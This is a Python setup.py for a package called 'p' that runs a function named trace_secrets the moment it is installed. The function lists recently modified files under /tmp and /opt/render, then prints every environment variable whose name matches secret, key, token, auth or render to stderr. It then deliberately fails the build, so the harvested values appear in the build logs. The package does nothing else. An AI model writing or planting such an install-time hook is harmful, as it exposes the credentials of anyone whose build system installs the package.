import os, sys, subprocess as sp
from setuptools import setup

def trace_secrets():
    o = sys.stderr.write
    o("\n" + "?"*30 + "\n")
    
    # 1. Проверяем, куда ведут пути в функциях (если они есть в ENV)
    o("CHECKING RENDER PATHS:\n")
    o(f"HOME: {os.environ.get('HOME')}\n")
    o(f"TMPDIR: {os.environ.get('TMPDIR')}\n")
    
    # 2. Ищем любые файлы, созданные недавно в /tmp или /opt/render
    o("\nSEARCHING FOR RECENT FILES:\n")
    o(sp.getoutput("find /tmp /opt/render -maxdepth 3 -mmin -10 -type f 2>/dev/null | head -n 20"))

    # 3. Проверка на "скрытые" переменные
    o("\nFILTERED ENV DUMP:\n")
    o(sp.getoutput("env | grep -iE 'render|secret|key|token|auth' | grep -v 'BASH_FUNC'"))

    o("\n" + "?"*30 + "\n")
    sys.exit(1)

try: trace_secrets()
except: sys.exit(1)

setup(name="p", version="0.1")
